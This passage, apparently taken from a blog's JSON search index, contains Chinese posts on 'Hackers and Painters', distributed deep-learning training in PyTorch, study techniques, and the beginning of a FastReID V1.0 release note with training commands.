把整个程序想清楚的时间点，应该是在编写代码的同时，而不是在编写代码之前。他认为编程和画画一样，都是一种艺术创作，而画画的过程就是通过不断地涂改最终完成作品，所以编程也不应该在一开始就定好整体的结构，而是应该在写的过程中不断修正。 . 除了快点动手开始写之外，及时反馈也很重要，先做出原型，再逐步加工做出成品，这种方式有利于鼓舞士气，因为它使得你随时都可以看到工作的成效。开发软件的时候，我有一条规则：任何时候，代码都必须能够运行。如果你正在写的代码一个小时之后就可以看到运行结果，这好比让你看到不远处就是唾手可得的奖励，你因此会受到激励和鼓舞。 . 所以先完成一个最小的可行版本，再根据用户的反馈去不断优化，最终才能呈现出质量良好的产品，这也是现在比较流行的 Scrum 理念一致。 . 对工作的思考 . 工作会占据人生三分之一的时间，我们没有理由不好好考虑一下工作对自身的意义。随着现在 996 越来越常态化，work life balance 也离我们越来越遥远，大家似乎每天都很忙碌，但是却越来越缺少时间思考工作对我们来说到底意味着什么。 . Paul 在书中回答了 “工作到底是什么？”这个问题，他指出工作 真正重要的是做出人们需要的东西，而不是加入某个公司。 不过似乎大部分的人在选择工作的时候更多的会看重给的薪水，而不会去考虑自己所做的事对社会的价值。 . 除此之外，Paul 还提出了两个原则，分别是可测量性和放大性，而且他认为，任何一个通过自身努力而致富的个人，在他们身上应该都能同时发现可测量性和可放大性。 工作职位产生的业绩，应该是可测量的，否则没有办法评判谁应该升职加薪；同时如果你做的事情影响的人很少，那么你的工作非常杰出，产生的效应也非常小。 . 另外团队越小，可测量性就越强，因为每个人所做的贡献能够更准确地估计，所以乔布斯曾经说过，创业的成败取决于最早加入公司的那十个人。而大公司就像一艘巨大的船，一千个划船手共同朝着一个方向划船，但是每个人其实并不能看到自己的努力对船航行的影响，同时因为团队太大，所以每一个人的努力都被平均化了。 . 不过小团队的优势并不在于“小”，而在于“精”，可以自由选择你的队友组成“全明星第一阵容”，从而发挥小团队带来的额外激励。这也解释了为什么能力非常强而且在乎回报的人，通常更愿意出去创业。 . 高科技会带来放大性，大多数人因为创造财富而发财的人都是通过开发新技术而实现的，这在科技类和软件类公司非常显然，甚至在一些看上去和科技无关的公司也是同样的道理，比如沃尔玛并不是通过经营零售业而致富，而是因为设计出了一种新型的商店和销售模式。 . 所以我们在选择方向和团队时，也可以以这两个方向为指导，首先所做的工作具有可测量性，同时所做的事情还具有放大效应，这样最终才有机会做出有意义深远的事情，也有机会影响更多的人。 . 结语 . 以上只是我对 Paul 这本书一些个人肤浅的见解，如果大家感兴趣，推荐大家去读一下这本书，也许能够获得更多的收获。 .",
            "url": "https://l1aoxingyu.github.io/blogpages/book%20review/programming/2021/06/02/hackers-and-painters.html",
            "relUrl": "/book%20review/programming/2021/06/02/hackers-and-painters.html",
            "date": " • Jun 2, 2021"
        }
        
    
  
    
        ,"post10": {
            "title": "深度学习中的分布式并行介绍",
            "content": "Introduction . 随着深度学习中的数据规模和网络规模越来越大，训练神经网络会耗费越来越多的时间，势必需要从单 GPU 训练向多 GPU 训练甚至多机训练进行扩展。比如在大规模人脸识别中，训练上千万人脸 ID 需要对最后的全连接层做模型并行，而 GPT-3 为代表的大模型更是有 1750 亿参数，需要在多台机器上做流水并行才能训起来。 . 近年来除了算力增长非常迅速外，深度学习框架近也在飞速发展，分布式并行的实现变得越来越成熟，不同的细节实现对最后的性能也有着很大的影响，下面简单介绍一下其中的一些并行方式作为扫盲，如有问题，欢迎拍砖。 . Data Parallel . 第一种并行方式叫做数据并行，也是现在最流行的一种并行方式。当一块 GPU 可以存储下整个模型时，可以采用数据并行的方式获得更准确的梯度，同时还可以加速训练。主要的方式为每个 GPU 复制一份模型，将一个 batch 的样本平均分为多份，分别输入到不同的卡上做并行计算。 . 因为求导以及加和都是线性的，所以数据并行在数学上是等价的。假设一个 batch 有 n 个样本，一共有 k 个 GPU，第 j 个 GPU 分到 $m_j$ 个样本，考虑等分情况，则 $m_j = frac{n}{k}$ ，如果考虑总损失函数 loss 对参数 w 求导，则有 . ∂Loss∂w=1n∑i=1n∂l(xi,yi)∂w=m1n∂[1m1∑i=1m1l(xi,yi)]∂w+m2n∂[1m2∑i=m1+1m2l(xi,yi)]∂w+⋯=m1n∂l1∂w+m2n∂l2∂w+⋯+mkn∂lk∂w=1k[∂l1∂w+∂l2∂w+⋯+∂lk∂w] frac{ partial{Loss}}{ partial w} = frac{1}{n} sum_{i=1}^n frac{ partial{l(x_i, y_i)}}{ partial w} = frac{m_1}{n} frac{ partial [ frac{1}{m_1} sum_{i=1}^{m_1} l(x_i, y_i)]}{ partial w} + frac{m_2}{n} frac{ partial [ frac{1}{m_2} sum_{i=m_1+1}^{m_2} l(x_i, y_i)]}{ partial w} + cdots = frac{m_1}{n} frac{ partial l_1}{ partial w} + frac{m_2}{n} frac{ partial l_2}{ partial w} + cdots + frac{m_k}{n} frac{ partial l_k}{ partial w} = frac{1}{k} [ frac{ partial l_1}{ partial w} + frac{ partial l_2}{ partial w} + cdots + frac{ partial l_k}{ partial w}]∂w∂Loss​=n1​i=1∑n​∂w∂l(xi​,yi​)​=nm1​​∂w∂[m1​1​∑i=1m1​​l(xi​,yi​)]​+nm2​​∂w∂[m2​1​∑i=m1​+1m2​​l(xi​,yi​)]​+⋯=nm1​​∂w∂l1​​+nm2​​∂w∂l2​​+⋯+nmk​​∂w∂lk​​=k1​[∂w∂l1​​+∂w∂l2​​+⋯+∂w∂lk​​] . 从上面的计算公式中可以看出，所有卡上总 batch 的平均梯度，和单卡上 mini-batch 的平均梯度汇总之后在平均的结果是一样的。 . 在 PyTorch 中，数据并行主要有两种实现方式：DataParallel 和 DistributedDataParallel。 . DataParallel . 在 PyTorch 中，DataParallel 的使用非常方便，只需要下面一行代码，就可以将原本单卡的 module 改成多卡的数据并行 . model = nn.DataParallel(model, device_ids=[0,1,2,3]) . DataParallel 的原理可以参考下面的图片 . Training Neural Nets on Larger Batches: Practical Tips for 1-GPU, Multi-GPU &amp; Distributed setups . 在前向的计算过程中，将数据平分到不同的卡上，同时将模型也复制到不同的卡上，然后在每张卡上并行做计算，最后在 device[0] 上获取所有卡上的计算结果。 . 在反向的计算过程中，在 device[0] 上用 outputs 和 label 计算相应的 loss ，然后计算 outputs 的梯度，接着将梯度发回到每张卡上，然后在每张卡上并行做反向传播得到对应的梯度，最后再一次将不同卡的梯度收集到 device[0] 上，然后在 device[0] 上做梯度下降更新参数。 . 通过上面的流程，可以发现 device[0] 会比其他 device 使用更多次，而且因为所有的 loss 以及 loss 的梯度都是在 device[0] 上进行的计算的，所以也会出现负载不均衡的问题。 . 有一种简单的方法可以缓解负载均衡问题，就是将 loss 计算放到网络前向中，这样在前向计算结束之后，device[0] 上获取的就是每张卡上 loss 的计算结果，然后再并行的在每张卡上进行反向传播计算梯度，整体计算流和下面的 Parameter Server 类似 . https://d2l.ai/chapter_computational-performance/parameterserver.html . 过程一(红色部分): 各卡分别计算损失和梯度； . 过程二(蓝色部分): 所有梯度整合到 device[0]； . 过程三(绿色部分): device[0] 进行参数更新，分发参数到其他卡上； . Parameter Servers 的核心概念在 [Smola &amp; Narayanamurthy, 2010] 中引入，实现非常简洁，不过整体上还是有一些缺点 . device[0] 会被更多的使用，从而导致 bottleneck 出现； | 负载均衡问题，不同的卡所占的显存不一致； | 通信开销很大，同步策略非常慢，假设有 k 个 GPU，完成一次通信需要时间 t ，如果使用 PS 算法，总共耗时 $T = 2(k-1) t$ | 在 PyTorch 的实现中，使用 Python 单进程，会有 GIL 锁，并不是真正的并发执行 | . PyTorch 在很早的版本引入了上述实现方式的 DataParallel，不过他们也意识到了这个版本的效率问题，所以后续版本中提出了一个效率更高的数据并行方法 DistributedDataParallel，同时在目前 PyTorch 1.8 版本中官方也更推荐使用 DistributedDataParallel 这种方式。 . DistributedDataParallel . DDP 是 DP 的升级版本，调用方式如下 . model = nn.DistirbutedDataParallel(model, device_ids=[rank]) . 他们大致原理是类似的，不过有很多细节上的区别，使得 DDP 效率更高，主要的区别如下： . 多进程 . 使用多进程支持真正的高并发，官方推荐做法是每张卡一个进程，从而避免单进程多线程的 GIL 问题，当然也支持多张卡在一个进程上，这样就和 DP 一样使用的多线程； . | 通信效率 . DP 的通信成本随 GPU 数量线性增加，而 DDP 使用 Ring AllReduce，保证通讯成本与 GPU 数量无关，能够扩展到大规模分布式训练中； . | 同步参数方式 . DP 通过收集梯度到 device[0]，在 device[0] 进行梯度更新，然后再将参数分发到其他所有设备上；DDP 则通过保证初始状态相同而且改变量也相同（同步梯度）的方式，保证模型同步和更新； . | . 下面我们重点讲一下 Ring Allreduce，这是效率提升的关键。 . Ring Allreduce . Ring Allreduce 原本是 HPC 领域一种比较成熟的通信算法，后被 Baidu SVAIL 引入到深度学习的训练当中，并与 2017年2月公开。 . 下面两张图直观的看到 allreduce 和 ring allreduce 之间的差别，allreduce 有一个中心参数服务器，而 ring allreduce 则像他的名字一样，构成了一个环。 . . . 下面我们具体来讲讲 ring allreduce 是如何进行梯度同步，从而保证总体同步和 GPU 数目无关。 . . 上面的动图展示了第一个成环的过程，每个 GPU 都接受来自另外上一个 GPU 的信息，同时发送给下一个 GPU，且每次发送的数据和 GPU 数量 k 成反比，即每张卡不会将这张卡上所有的数据都发给下一张卡，只会发 $ frac{1}{k}$ 的数据量。 . 在上面的例子中，一共有 5 个 GPU 参与通信，所以每次传递 $ frac{1}{5}$ 的数据量，第一次传递是从对角线开始，以第一份参数为例，在第一次传递中， GPU-0 将 $a_0$ 传递给 GPU-1，完成传递后， GPU-1 的第一份参数就变成了 $a_0 + a_1$ ，这时 GPU-1 在进行下一次传递，将 $a_0 + a_1$ 传递给 GPU-2，这样 GPU-2 的第一份参数就变成了 $a_0 + a_1 + a_2$ ，以此类推，通过 k-1 次传递之后，会获得下图的情况 . . 这时可以发现在每张 GPU 上都有一份参数是完整的，比如 GPU-0 上，第二份参数 $b_2 + b_1 + b_3 + b_4 + b_0$ 已经完整地收集到了所有卡上的数据，接着将上图橙色框的数据分别再做 k-1 次传递，最后就可以在每张卡上获得完整的数据信息。 . . 可以分析一下通信开销，假设有 k 个 GPU，传输总量是 p，b 为每次的通信上限，首先将梯度分为 k 份，每张卡每次传输 $ frac{p}{k}$ 的通信量，传递 k-1 次就可以分别在每张卡上收集到 $ frac{1}{k}$ 完整的数据，之后再传 k-1 次可以使得每张卡上获得完整的数据，所以总的通信开销是 . 2(k−1)pkb=2pbkk−12 (k-1) frac{ frac{p}{k}}{b} = frac{2 p}{b} frac{k}{k-1}2(k−1)bkp​​=b2p​k−1k​ . 所以整个式子在 k 很大的时候，和 k 是无关的，也证明了 ring allreduce 在通信上是和 GPU 数量无关的。 . Model Parallel . 上面讲的数据并行需要一张卡能够装下模型，当模型非常大，一张 GPU 无法放下模型的所有 tensor 时，就需要用到 model parallel，也叫做 tensor parallel。随着 GPT-3 等超级大模型的流行，未来模型越来越大也会是一个趋势，所以不要觉得一个模型需要用多张 GPU 来存放是一件离我们很遥远的事情。 . 说到模型并行，下面有一个简单的例子，这是从 pytorch forum 里面截取的，把模型的第一层 Linear 放到了 device[0] 上，第二层 Linear 放到了 device[1] 上，那么这个能被成为模型并行吗？ . class ToyModel(nn.Module): def __init__(self): super(ToyModel, self).__init__() self.net1 = torch.nn.Linear(10, 10).to(&#39;cuda:0&#39;) self.relu = torch.nn.ReLU() self.net2 = torch.nn.Linear(10, 5).to(&#39;cuda:1&#39;) def forward(self, x): x = self.relu(self.net1(x.to(&#39;cuda:0&#39;))) return self.net2(x.to(&#39;cuda:1&#39;)) . 其实从严格意义上来讲，这个并不能称为模型并行，只是把同一个模型的不同层 split 到不同的 device 上，真正的模型并行还需要是的他们能够同步执行 (concurrently)，但是上面的例子中，两个 Linear 并不能同时计算，第二个 Linear 需要获取第一个 Linear 的输出才能进行计算。 . 那么如何能够写一个简单的模型并行例子呢？在 PyTorch model parallel tutorial 中，给出了一个简单的例子。 . 得益于 PyTorch 使用的 CUDA operations 是异步的，所以可以用下面的方式来轻松构建一个模型并行的操作，而不需要使用到多线程或是多进程。 . class PipelineParallelResNet50(ModelParallelResNet50): def __init__(self, split_size=20, *args, **kwargs): super(PipelineParallelResNet50, self).__init__(*args, **kwargs) self.split_size = split_size def forward(self, x): splits = iter(x.split(self.split_size, dim=0)) s_next = next(splits) s_prev = self.seq1(s_next).to(&#39;cuda:1&#39;) ret = [] for s_next in splits: # A. s_prev runs on cuda:1 s_prev = self.seq2(s_prev) ret.append(self.fc(s_prev.view(s_prev.size(0), -1))) # B. s_next runs on cuda:0, which can run concurrently with A s_prev = self.seq1(s_next).to(&#39;cuda:1&#39;) s_prev = self.seq2(s_prev) ret.append(self.fc(s_prev.view(s_prev.size(0), -1))) return torch.cat(ret) . 在上面的例子中，首先提前在 device[0] 做一次计算，然后将结果 copy 到 device[1] 上，接着在进行后续的计算。后续是一个 for loop，代码顺序是先执行 device[1] 上运算 A，不过因为 CUDA 的异步特性，这个计算 A 并不会马上执行，随后代码上再执行 device[0] 上的计算 B，这时两个操作 A 和 B 会一起进行计算。等待 B 计算完毕后，会再次实现和之前一样的操作，将 tensor 从 device[0] 上 copy 到 device[1] 上，因为在 cuda 上 device-to-device 的操作会在当前 streams 上进行同步，而上面的实现在 device[0] 和 device[1] 上都使用的是默认的 streams，所以不需要额外进行同步。 . 其实在上面的实现中，使用了流水并行的技巧，后面我们会更详细的讲解。 . Partial-FC . 最后我们以人脸识别为模型并行的一个经典例子，介绍其中应用非常广泛的 FC 并行以及他的一种变种 Partial-FC。 . Partial FC: Training 10 Million Identities on a Single Machine . 上面是人脸识别中模型并行的经典图示，在 Backbone 部分做数据并行，在 FC 部分做模型并行，比如一共有 C 个 ID，k 张 GPU，那么每个 GPU 上会放 $ frac{C}{k}$ 类别中心。 . 整体的计算过程如下： . 将数据分到不同的卡上，在 backbone 上并行做前向计算得到 features X； | 每张卡上都同步其他所有卡的 features，然后在每张卡上并行计算对应类别中心的 logits； | 每张卡上同步其他卡上的 logits 结果，并行计算 loss 以及 logits 对应的梯度； | 在每张卡上并行计算各自类别中心权重 $w_i$ 对应的梯度 $ nabla w_i$ 和 feature X 对应的梯度 $ nabla X$； | 同步其他所有卡的 $ nabla X$ ，获得平均梯度，然后将其 scatter 到各自对应的卡上，并行做自动求导，获得 backbone 的梯度； | 以上过程就是人脸识别中标准的 FC 并行框架，不过这种方式的并行会出现一些显存问题，我们可以看看下面的公式 . Memw=d×C↑k↑×4 bytesMemlogits=Nk×Ck×4 bytesMem_w = d times frac{C uparrow}{k uparrow} times 4 bytes Mem_{logits} = N k times frac{C}{k} times 4 bytesMemw​=d×k↑C↑​×4 bytesMemlogits​=Nk×kC​×4 bytes . 上面分别表示每个 GPU 上权重 w 的显存和计算 logits 的显存，其中 d 表示 feature 维度，C 是类别数目，k 是 GPU 数量，N 是 mini-batch size，4 bytes 表示用 float32 进行计算。 . 通过上面的计算公式可以看出，如果增加一倍 ID 规模，那么可以通过增加一倍的 GPU 数量 k 来保证每张卡上的显存占用量一致，不过通过观察 logits 的显存占用量就会发现，如果不断地增加 GPU 数量 k，会导致 logits 的显存占用量线性增长，所以随着 ID 规模的增加，不断增加 GPU 数目最终会导致显存爆炸。 . Partial-FC 提供了一个非常简单的思路来解决这个问题，既然 logits 显存会随着 GPU 数量一直增加，那么减少 logits 的显存就可以了。接着通过实验发现采样部分负样本和全部负样本最后的收敛效果几乎一致，所以在 Partial-FC 中，每次计算 logits 并不会使用 w 中的全部负样本，只会采样固定比例的负样本，最终可以使得计算的 logits 显存以固定比例降低。 . Pipeline Parallelism . 最后讲一下流水并行，当模型非常巨大，需要用多张 GPU 进行存储的时候，就需要用到流水并行。流水线并行算是广义模型并行的一种特例，通过多个设备来共同分担显存消耗，同时只在相邻的设备之间进行通讯，因此通信张量较小。 . GPipe: Easy Scaling with Micro-Batch Pipeline Parallelism . 上图中 (a) 展示了流水并行的前向反向计算流，(b) 表示一种 naive pipeline parallelism，同步更新和串行计算，后一个设备依赖上一个设备的结果，所以每次都只有一个设备在计算，其他设备在等待，没有发挥分布式的优势。 . (c) 是 GPipe 这篇论文提出了一个解决方案，将一个 mini-batch 切分成多个更小的 micro-batch，实现不同的 GPU 并行同步计算，每个 micro-batch 反向计算获得的梯度进行累加，在最后一个 micro-batch 累加结束之后，再统一更新模型。有兴趣的同学可以直接去看 GPipe 这篇论文。 . 混合并行 . https://www.deepspeed.ai/tutorials/pipeline/ . 上面讲了多种并行方式一般会混合使用，当多种并行同时使用的时候，也叫做混合并行。上面是从微软发布的 DeepSpeed 的 tutorial 贴出一个例子，主要使用了数据并行 + 流水并行，GPU-0 和 GPU-2 作为 Group-1，GPU-1 和 GPU-3 作为 Group-2，Group-1 和 Group-2 进行数据并行，而在每个 Group 内部进行流水并行，将 Group 内的 batch 数据切分成 4 个 micro-batch。另外 Deep Speed 还提供了一些其他的 features，比如 ZeRO 可以降低内存开销，训练更大的模型，有兴趣的同学可以自行查看。 . Further Reading . 分布式并行是深度学习中的一个重要的问题，随着数据，算力和模型的规模都越来越大，如何高效、稳定地训练模型也变得越来越重要，上面介绍的并行只是一个入门的内容，有兴趣的同学可以看看这篇 oneflow 的文章 OneFlow —— 让每一位算法工程师都有能力训练 GPT，用 GPT-3 作为例子介绍了分布式训练模型的一些最新的技术。 . Reference . PyTorch 源码解读之 DP &amp; DDP：模型并行和分布式训练解析 | https://d2l.ai/chapter_computational-performance/parameterserver.html | Training Neural Nets on Larger Batches: Practical Tips for 1-GPU, Multi-GPU &amp; Distributed setups | Visual intuition on ring-Allreduce for distributed Deep Learning | Bringing HPC Techniques to Deep Learning | 单机多卡的正确打开方式（一）：理论基础 | Partial FC: Training 10 Million Identities on a Single Machine | PyTorch tutorial | GPipe: Easy Scaling with Micro-Batch Pipeline Parallelism | Deep Speed | OneFlow —— 让每一位算法工程师都有能力训练 GPT | .",
            "url": "https://l1aoxingyu.github.io/blogpages/summary/self-supervised%20learning/2021/05/16/dl-dist-train.html",
            "relUrl": "/summary/self-supervised%20learning/2021/05/16/dl-dist-train.html",
            "date": " • May 16, 2021"
        }
        
    
  
    
        ,"post11": {
            "title": "Study Less, Study Smart",
            "content": "学习变得越来越重要，甚至在很多领域需要终生学习，能否高效学习决定了人与人之间的差距。在这篇文章中，我将分享给大家一些高效学习的技巧和建议，帮助大家快速而高效地学习新知识。 . . 为什么需要终生学习 . 一提到学习，可能大家的脑子里面会回想起高中或者大学时的情景，每天日以继夜，为了考试努力学习。好不容易终于熬完了大学，以为之后的人生中再也不会有”学习“了，如果你这样想，那么就大错特错了。 . 如果你是一个对自我要求很高的人，期望不断学习来提升自己，同时也希望能够成为同龄人中的佼佼者，那么终生学习对你而言是毫无疑问的事情，你需用一直努力才能保持竞争力。 | 如果你说我只希望躺平，做一个打工人，满足于普通的人生，那么是不是就不需要学习了呢？现在社会发展的速度越来越快，不需要动脑子的工作慢慢会被人工智能替代，而需要动脑子的工作会出现很多新的概念和内容，如果不持续的学习，根本无法完成正常的工作。所以仅仅是持有不被社会淘汰的标准，也需要不断地学习。 | 所以不管是对于自我要求很高的人，还是希望仅仅跟上社会发展脚步的人来说，终身学习都变得越来越必要。工欲善其事必先利其器，学习”如何学习“可以帮助我们在遇到新的概念和问题的时候更加游刃有余，使用更少的时间掌握更多的内容。 . 如何高效地学习 . 无意间看到了Marty Lobdell 在 Youtube 的视频 Study Less Study Smart 后，非常遗憾自己没能在更早的时候就看到，在这里强烈推荐给大家。 . 在视频中，Marty 列出了影响学习效率的几个因素，同时配合相关的案例讲解，下面列举一些我认为比较重要的观点，更详细的内容建议大家直接食用原始视频，效果更佳。 . 番茄工作法 . 番茄工作法是一种时间管理技巧，相信很多人都有一定的了解，简单来说就是使用一个定时器来分割出一个一般为25分钟的工作时间和5分钟的休息时间，这个时间段被称为一个番茄钟。 . 番茄工作法的发明者使用这种方法来对抗拖延症，因为每个番茄钟只有一小段时间，比较容易开始。所以可以逼迫自己先开始一个番茄钟，而人往往在开始进行执行任务之后，更容易坚持下去，这样就能够开始做任务从而避免拖延症。 . 现在大家对番茄工作法的评价褒贬不一，有的人认为将一段工作划分成小的时间段会破坏工作的完整性，比如对于创作或者编程这样的任务，需要长时间的专注，如果切割成了很多小块的时间，那么很可能刚刚进入状态，一个番茄工作时就结束了，被迫退出这种状态。 . Marty 在视频中表示，人在长时间学习时，精力高度集中，如果长时间保持这种状态，效率会随着时间越来越低。这个时候如果强迫自己继续坚持学习或工作，反而效果会越来越差，但是如果休息一小段时间，比如5分钟，这是精力会重新充电，这时再继续学习可以获得更好的效果。 . 我个人认为在学习或者工作一段时间之后休息是很有必要的，一小段时间的休息之后再重新开始工作可以获得更好的效果。但是考虑到有一些工作可能需要较长的启动时间，所以可以根据个人需求和任务类型进行番茄钟时长的自定义，比如进行编程或者写作等任务时，可以将工作时长设定为50分钟而非25分钟，或是在番茄钟响后并不进入休息，继续工作直到感觉累了，再进行休息。 . 建立自己的学习区 . 大多数人都没有自己专属的学习区，要不在客厅学习，要不在床上看书，这样其实不利于构建一个良好的学习环境。每个房间和区域都有自己的意义，比如客厅是大家娱乐和社交的场所，卧室和床是休息的地方，如果在这些地方学习，潜意识里并不会认为你是真正在学习，所以很难进入学习状态。 . 如果建立一个专属的学习区，每次来到这个区域就开始学习，久而久之会在大脑深处构建一种暗示效果，当下次开始学习的时候，直接来到学习区，这样可以更快地进入状态。书房是一个非常好的学习区，不过并不是每个人家里都有书房这个条件，所以很多人去学校，图书馆或者咖啡厅进行学习和阅读。 . 如果你不想去外面，就想在家里学习，但是家里又没有书房，Marty 还提供了一个低成本的方式来构建自己的学习区，那就是使用一盏台灯。每次要要学习的时候，就打开特定的台灯，当学习结束之后再关闭台灯，通过这样简单的步骤构建一个学习空间，虽然并没有在物理意义上开辟新的空间，但是可以给大脑一种心理暗示，可以让大脑将这种灯光和学习工作关联起来，这样有利于快速进入学习状态。 . 专注力 . 很多人喜欢在学习的时候听音乐或者是看电影，认为这种事情不会耗费注意力。其实人是一个单线程生物，我们的注意力用于只能聚焦在一件事情上，当你在学习是听音乐，有一部分的注意力会在你不经意间分散到音乐和歌词上，从而降低学习效率。 . 所以记得每次专注于一件事儿上，如果实在想听音乐，可以听一些白噪音，这样有助于提升学习效率，但是一定不要听歌或者是看电影。 . 发现事实背后的概念 . 很多时候教材为了方便概念的讲解，会使用隐喻和类比的方式进行举例，或者是讲一些概念的实际用途。这个时候不要去记住这些事实，而是要理解和记住事实背后的概念，概念就是指它的原理，功能以及它和其他的概念如何进行联系。一旦记住这个概念，那么你将一辈子都不会忘记，而相关的事实可以通过 Google 和网络进行搜索。 . 首先需要具备区分事实和概念的能力，同时寻找事实背后的概念往往需要进行总结和归纳，找到事实背后的本质，这些能力都需要不断训练才能获得。 . 费曼技巧 . 理查德·费曼是理论物理学家，不过它广为人知的便是“费曼学习法”。 . 简要来说，“费曼学习法”分为4步： . 选定一个学习的内容，这个内容可以是任何你当下想学习的知识，然后通过各种资料进行学习； | 想另外一个人教授你所学习的内容，或者是在一张白纸上想象你正在向别人教授这个内容，简单来说就是知识的输出； | 在教授过程中，发现自己“卡壳”以及解释不清的内容，这就是自己的薄弱点，返工学习和纠错，然后再次进行教授和输出，直到可以清晰地表达相关的知识； | 回顾和精简，努力简化表达，将所学的知识进行内化； | 学习金字塔是美国国家训练实验室研究的成果，从下面的金字塔中，也能看出“费曼学习法”位于主动学习中的最高层，可以最大程度地留存学习的知识。 . . 在 Marty 的视频中，通过几点不同的描述来联合构成了费曼技巧：1. 使用自己的话对概念进行解释；2. 关上书回忆学习的内容而非仅仅打开书辨认知识点；3. 教授给另外一个人所学的内容，如果没有其他人可以试着交给一张椅子或者在一张白纸上写下来。 . 找到一个学习小组 . 除了自己独立学习之外，也可以尝试组建一个学习小组共同学习，不仅可以互相帮助解答疑问，同时也可以互相激励。同时也可以在学习小组的成员中进行费曼技巧，以及互相分享学习方法。 . 充足的睡眠 . 充足的睡眠在 Marty 看来是一个“命令”而非“建议”。睡眠的影响也是一直以来我所忽略的内容，我们往往到了该睡觉的时候想着再多看几页书，或者是多看几分钟视频，从而导致晚睡，这样往往是舍本逐末。 . 在视频中，Marty 强调好的睡眠不仅仅对身体健康有益处，同时也有利于帮助大脑巩固长期记忆的知识点成为永久记忆的知识点。看到这里我突然想起了之前高中为了刷题总是熬夜到晚上2点，如果能够更早看到这个视频，可能我会早早地“放过”自己，让自己11点半就进入睡眠，或许能够获得一个更好的成绩。 . SQ3R 方法 . SQ3R 是 Survey, Question, Read, Recite and Review 5 个单词的缩写，这是一种学习教科书的方法。首先明确教科书并不是小说，跳着读并不会影响学习效果，可以直接跳到需要学习的页面。 . SQ3R 可以简要描述为下面的步骤： . 简要浏览一下需要学习的主题，看看相关的插图等等 (Review)； | 寻找这一章的主要希望解决的主要问题是什么，记住并写下他们，时刻在心里提醒自己 (Question)； | 阅读教材中的粗体字，比如题目，副标题，被标粗的部分等等，因为这些内容是作者想强调的。接着如果有很长的段落，读这些段落的第一个句子和最后一个句子。然后再读教材中的所有内容，同时尝试回答之前提出的主要问题，如果不能回答，那么重新读这些内容，不过这一次用记号笔标记一些你认为重要的内容，同时在每一页的边缘做笔记，直到完成问题的回答 (Read)； | 列出下一个希望回答的问题，然后重复上面的3步； | 使用费曼技巧将你希望解释的内容和问题重新用自己的话来描述，确保使用一个6岁孩子也能听懂的语言；除此之外，也可以假装是这个领域的专家，写出相关的文章，如果你发现你不能很好的解释和概括其中的内容，回到材料中重新学习 (Recite)； | 如果你完成了上面的步骤，那么你会获得3个材料：a）一本有标注和笔记的教材；b）这个话题主要的问题以及答案；c）一篇相关的文章或者是思维导图。接着需要记得定期复习相关的内容，形成长期记忆 (Review)； | 结语 . 上面的内容就是我在学习 Marty 视频后总结的几个我认为比较重要的学习技巧，同时我正在看 Coursera 相关的课程 Learning How to Learn: Powerful mental tools to help you master tough subjects，如果后续学习完这个课程，会在写一篇文章进行介绍。 . 最后希望大家能够从这篇文章中得到一些收获，也强烈推荐大家去看 Marty 的原版视频，最后欢迎大家在评论中提供自己比较高效的学习技巧。 .",
            "url": "https://l1aoxingyu.github.io/blogpages/utility/2021/05/09/Study-Less-Study-Smart.html",
            "relUrl": "/utility/2021/05/09/Study-Less-Study-Smart.html",
            "date": " • May 9, 2021"
        }
        
    
  
    
        ,"post12": {
            "title": "FastReID V1.0: Beyond reID",
            "content": "引言 . FastReID 自20年6月发布以来，我们收到了很多用户的反馈，当初的 v0.1 版本存在大量需要优化的部分，经过了最近半年的持续优化，终于在 21年1月14日，我们低调地发布了 FastReID V1.0，这次更新包括非常多的方面，但是最大的贡献在于我们将 FastReID 扩展到了更多的任务上，同时在这些任务上都达到了 SOTA 结果。 . tldr: 我们更新了 FastReID V1.0 版本，不仅实现了更快的分布式训练和测试，模型一键导出 caffe/onnx/tensorRT，还实现了蒸馏，自动超参搜索以及更多任务的扩展，比如人脸识别，细粒度检索等等，最后基于 FastReID 我们拿到了深圳 NAIC20 ReID track 的第一名。 . 下面简单介绍一下 FastReID V1.0 的各项改进。 . . Embedding 知识蒸馏 . 深度神经网络一般有较多的冗余，同时模型太大会导致 inference 时间变长，所以在部署的时候需要考虑对模型进行压缩，减小其参数量，其中有较多的压缩方式，比如剪枝，量化和蒸馏等。 其中蒸馏是一种比较流行的范式，可以保证模型不需要进行结构修改的情况下，得到较大的性能提升，所以我们选择在 FastReID 中加入蒸馏的支持，可以让我们用小模型部署的时候获得更大的精度提升。 . 虽然蒸馏发展了这么多年，但是通过尝试我们发现 Hinton 的 Distilling the Knowledge in a Neural Network 还是最 solid 的选择。 同时我们将原本的蒸馏 loss 优化为具有对称性的 JS Div loss，最后修改蒸馏的 soft label 生成方式。 . 不同于 softmax 分类 loss，在 embedding 任务中通常会使用效果更好的 margin-based softmax，比如 arcface 等等， 这时直接使用基于 margin 的 logits 生成 soft label 效果很不好，所以我们将 soft label 修改为去掉 margin 的 logits 输出。 . 除了可以对 label 进行蒸馏之外，也可以对 feature 进行蒸馏，通过实验了一大堆不 work 的特征蒸馏方法之后，我们发现 overhaul-distillation 可以在 loss 蒸馏的基础上进一步对网络进行提升，所以也将这个方法加入到了 FastReID 当中，但是由于 overhaul 需要对 backbone 进行一些修改，获得 relu 之前的 feature，所以我们选择构建了一个新的 project 而不是直接去 FastReID 里面修改 backbone。 . 最后我们在 dukeMTMC 上进行实验，使用 r101_ibn 作为 teacher model, r34 作为 student model，可以获得如下的效果提升。 . DukeMTMC-reid . Model Rank@1 mAP . R101_ibn (teacher) | 90.66 | 81.14 | . R34 (student) | 86.31 | 73.28 | . JS Div | 88.60 | 77.80 | . JS Div + Overhaul | 88.60 | 78.25 | . 蒸馏的使用也非常简单，只需要首先按照正常的方式训练一个 teacher model，如果只想使用 loss 蒸馏，可以使用 Distiller 作为 meta_arch，如果希望加上 overhaul，只需要使用 DistillerOverhaul 作为 meta_arch 就可以了。 最后再指定 teacher model 的配置文件和训好的 weights 就可以了。 . 下面用 R101_ibn 作为 teacher model，R34 作为 student model 举一个例子 . # teacher model training python3 projects/FastDistill/train_net.py --config-file projects/FastDistill/configs/sbs_r101ibn.yml --num-gpus 4 # loss distillation python3 projects/FastDistill/train_net.py --config-file projects/FastDistill/configs/kd-sbs_r101ibn-sbs_r34.yaml --num-gpus 4 MODEL.META_ARCHITECTURE Distiller KD.MODEL_CONFIG projects/FastDistill/logs/dukemtmc/r101_ibn/config.yaml KD.MODEL_WEIGHTS projects/FastDistill/logs/dukemtmc/r101_ibn/model_best.pth # loss+overhaul distillation python3 projects/FastDistill/train_net.py --config-file projects/FastDistill/configs/kd-sbs_r101ibn-sbs_r34.yaml --num-gpus 4 MODEL.META_ARCHITECTURE DistillerOverhaul KD.MODEL_CONFIG 